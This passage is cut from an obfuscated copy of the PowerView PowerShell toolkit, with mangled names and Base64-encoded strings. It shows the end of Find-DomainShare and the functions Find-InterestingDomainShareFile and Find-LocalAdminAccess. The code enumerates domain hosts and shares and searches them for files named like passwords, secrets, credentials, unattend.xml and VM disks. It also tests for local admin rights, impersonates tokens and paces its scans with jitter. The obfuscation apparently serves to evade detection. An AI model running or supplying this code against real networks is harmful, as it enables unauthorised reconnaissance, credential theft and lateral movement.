            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABEAGUAbABhAHkAOgAgACQARABlAGwAYQB5ACwAIABKAGkAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')))
            ${_/==\/\/==\/=\/==} = 0
            ${__/\_/\/\/\/\/\_/} = New-Object System.Random
            ForEach (${__/==\_/=\/===\/=} in ${_/=\__/=\___/=\/=}) {
                ${_/==\/\/==\/=\/==} = ${_/==\/\/==\/=\/==} + 1
                sleep -Seconds ${__/\_/\/\/\/\/\_/}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainShare] Enumerating server ${__/==\_/=\/===\/=} (${_/==\/\/==\/=\/==} of $(${_/=\__/=\___/=\/=}.count))"
                icm -ScriptBlock ${____/=\/\_/\/\/\_} -ArgumentList ${__/==\_/=\/===\/=}, $CheckShareAccess, ${/=\_______/\/\__/}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUwBoAGEAcgBlAF0AIABVAHMAaQBuAGcAIAB0AGgAcgBlAGEAZABpAG4AZwAgAHcAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/====\__/\_/===\/} = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = ${/=\_______/\/\__/}
            }
            _/=\__/=\__/=\/==\ -____/=\/=\_/=\/\/ ${_/=\__/=\___/=\/=} -___/\/=\____/=\/\/ ${____/=\/\_/\/\/\_} -__/\/\/\/\____/\/\ ${/====\__/\_/===\/} -Threads $Threads
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function Find-InterestingDomainShareFile {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBzAGUAYwByAGUAdAAqAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,
        [String[]]
        $ExcludedShares = @('C$', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgB0ACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA=')))),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/\_/==\__/=\/\} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${_/=\_____/===\/\/=} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${___/\/\/\__/==\/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/=\__/=\___/=\/=} = ${____/=\/=\_/=\/\/}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABRAHUAZQByAHkAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
            ${_/=\__/=\___/=\/=} = _/==\/\/\_______/\ @_/\/\_/==\__/=\/\ | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $(${_/=\__/=\___/=\/=}.Length)"
        if (${_/=\__/=\___/=\/=}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABOAG8AIABoAG8AcwB0AHMAIABmAG8AdQBuAGQAIAB0AG8AIABlAG4AdQBtAGUAcgBhAHQAZQA=')))
        }
        ${____/=\/\_/\/\/\_} = {
            Param(${____/=\/=\_/=\/\/}, $Include, $ExcludedShares, $OfficeDocs, ${_/===\/=\__/=\___/}, $FreshEXEs, ${___/=\____/==\__/\}, ${_/=\/=\_/=\/=\/\/=})
            if (${_/=\/=\_/=\/=\/\/=}) {
                $Null = _/=\/=\/==\_/=\__/ -_/=\/=\_/=\/=\/\/= ${_/=\/=\_/=\/=\/\/=} -___/==\_/\/=\_/=\_
            }
            ForEach (${__/==\_/=\/===\/=} in ${____/=\/=\_/=\/\/}) {
                ${_/=\/\___/=====\/} = @()
                if (${__/==\_/=\/===\/=}.StartsWith('\\')) {
                    ${_/=\/\___/=====\/} += ${__/==\_/=\/===\/=}
                }
                else {
                    ${__/==\/=\/\/\/=\/} = Test-Connection -Count 1 -Quiet -ComputerName ${__/==\_/=\/===\/=}
                    if (${__/==\/=\/\/\/=\/}) {
                        ${/\_____/=\___/===} = __/=\_/==\/=\/\_/= -____/=\/=\_/=\/\/ ${__/==\_/=\/===\/=}
                        ForEach (${_/==\___/\_/\/===} in ${/\_____/=\___/===}) {
                            ${/=\_/\_/=\__/\_/\} = ${_/==\___/\_/\/===}.Name
                            $Path = '\\'+${__/==\_/=\/===\/=}+'\'+${/=\_/\_/=\__/\_/\}
                            if ((${/=\_/\_/=\__/\_/\}) -and (${/=\_/\_/=\__/\_/\}.Trim() -ne '')) {
                                if ($ExcludedShares -NotContains ${/=\_/\_/=\__/\_/\}) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        ${_/=\/\___/=====\/} += $Path
                                    }
                                    catch {
                                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIABhAGMAYwBlAHMAcwAgAHQAbwAgACQAUABhAHQAaAA=')))
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach (${_/==\___/\_/\/===} in ${_/=\/\___/=====\/}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABzAGgAYQByAGUAOgAgACQAewBfAC8APQA9AFwAXwBfAF8ALwBcAF8ALwBcAC8APQA9AD0AfQA=')))
                    ${_____/\/\_/=\__/=} = @{
                        'Path' = ${_/==\___/\_/\/===}
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        ${_____/\/\_/=\__/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAaQBjAGUARABvAGMAcwA=')))] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        ${_____/\/\_/=\__/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        ${_____/\/\_/=\__/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABBAGMAYwBlAHMAcwBUAGkAbQBlAA==')))] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        ${_____/\/\_/=\__/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        ${_____/\/\_/=\__/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] = $CreationTime
                    }
                    if (${___/=\____/==\__/\}) {
                        ${_____/\/\_/=\__/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] = ${___/=\____/==\__/\}
                    }
                    _/\____/=\/\_/\__/ @_____/\/\_/=\__/=
                }
            }
            if (${_/=\/=\_/=\/=\/\/=}) {
                __/\/=\/\______/\/
            }
        }
        ${/=\_______/\/\__/} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
            }
            else {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential -___/==\_/\/=\_/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $(${_/=\__/=\___/=\/=}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABEAGUAbABhAHkAOgAgACQARABlAGwAYQB5ACwAIABKAGkAdAB0AGUAcgA6ACAAJABKAGkAdAB0AGUAcgA=')))
            ${_/==\/\/==\/=\/==} = 0
            ${__/\_/\/\/\/\/\_/} = New-Object System.Random
            ForEach (${__/==\_/=\/===\/=} in ${_/=\__/=\___/=\/=}) {
                ${_/==\/\/==\/=\/==} = ${_/==\/\/==\/=\/==} + 1
                sleep -Seconds ${__/\_/\/\/\/\/\_/}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server ${__/==\_/=\/===\/=} (${_/==\/\/==\/=\/==} of $(${_/=\__/=\___/=\/=}.count))"
                icm -ScriptBlock ${____/=\/\_/\/\/\_} -ArgumentList ${__/==\_/=\/===\/=}, $Include, $ExcludedShares, $OfficeDocs, ${_/===\/=\__/=\___/}, $FreshEXEs, ${___/=\____/==\__/\}, ${/=\_______/\/\__/}
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ASQBuAHQAZQByAGUAcwB0AGkAbgBnAEQAbwBtAGEAaQBuAFMAaABhAHIAZQBGAGkAbABlAF0AIABVAHMAaQBuAGcAIAB0AGgAcgBlAGEAZABpAG4AZwAgAHcAaQB0AGgAIAB0AGgAcgBlAGEAZABzADoAIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/====\__/\_/===\/} = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = ${_/===\/=\__/=\___/}
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = ${___/=\____/==\__/\}
                'TokenHandle' = ${/=\_______/\/\__/}
            }
            _/=\__/=\__/=\/==\ -____/=\/=\_/=\/\/ ${_/=\__/=\___/=\/=} -___/\/=\____/=\/\/ ${____/=\/\_/\/\/\_} -__/\/\/\/\____/\/\ ${/====\__/\_/===\/} -Threads $Threads
        }
    }
    END {
        if (${/=\_______/\/\__/}) {
            __/\/=\/\______/\/ -_/=\/=\_/=\/=\/\/= ${/=\_______/\/\__/}
        }
    }
}
function Find-LocalAdminAccess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${____/=\/=\_/=\/\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Switch]
        $CheckShareAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/\_/==\__/=\/\} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${_/\_____/====\/===} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${_/=\_____/===\/\/=} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${___/\/\/\__/==\/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\_/==\__/=\/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/=\__/=\___/=\/=} = ${____/=\/=\_/=\/\/}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${_/=\__/=\___/=\/=} = _/==\/\/\_______/\ @_/\/\_/==\__/=\/\ | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $(${_/=\__/=\___/=\/=}.Length)"
        if (${_/=\__/=\___/=\/=}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        ${____/=\/\_/\/\/\_} = {
            Param(${____/=\/=\_/=\/\/}, ${_/=\/=\_/=\/=\/\/=})
            if (${_/=\/=\_/=\/=\/\/=}) {
                $Null = _/=\/=\/==\_/=\__/ -_/=\/=\_/=\/=\/\/= ${_/=\/=\_/=\/=\/\/=} -___/==\_/\/=\_/=\_
            }
            ForEach (${__/==\_/=\/===\/=} in ${____/=\/=\_/=\/\/}) {
                ${__/==\/=\/\/\/=\/} = Test-Connection -Count 1 -Quiet -ComputerName ${__/==\_/=\/===\/=}
                if (${__/==\/=\/\/\/=\/}) {
                    ${/=\/=\_/\___/\_/\} = _/=\/\_/\_/=====\_ -____/=\/=\_/=\/\/ ${__/==\_/=\/===\/=}
                    if (${/=\/=\_/\___/\_/\}.IsAdmin) {
                        ${__/==\_/=\/===\/=}
                    }
                }
            }
            if (${_/=\/=\_/=\/=\/\/=}) {
                __/\/=\/\______/\/
            }
        }
        ${/=\_______/\/\__/} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential
            }
            else {
                ${/=\_______/\/\__/} = _/=\/=\/==\_/=\__/ -Credential $Credential -___/==\_/\/=\_/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $(${_/=\__/=\___/=\/=}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ATABvAGMAYQBsAEEAZABtAGkAbgBBAGMAYwBlAHMAcwBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${_/==\/\/==\/=\/==} = 0
